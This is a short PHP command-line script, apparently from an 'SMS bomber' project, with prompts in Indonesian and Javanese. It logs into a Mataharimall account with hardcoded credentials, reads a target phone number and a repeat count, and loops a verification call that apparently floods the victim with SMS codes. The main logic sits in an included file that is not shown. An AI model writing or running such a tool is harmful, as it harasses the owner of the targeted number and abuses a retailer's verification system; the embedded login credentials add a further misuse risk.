<?php

/*

https://github.com/nee48/bomsmsmthrmall/

Made by Stefan

Modified by Riko

*/

include 'bommthrml.php';

$init = new Bom();

// Konfigurasi Akun Mataharimall

$init->email = "zumupolij@c1oramn.com";

$init->pass = "Hilih kintil";

$init->Login($init->email,$init->pass);

//Eksekusi Sms Boomber

echo "Nomor e sopo (pakai 62): ";

$a = trim(fgets(STDIN));

$init->no = "$a";

echo "Njaluk Piro : ";

$b = trim(fgets(STDIN));

$loop = "$b";

for ($i=0; $i < $loop; $i++) { 

$init->Verif($init->no);

}

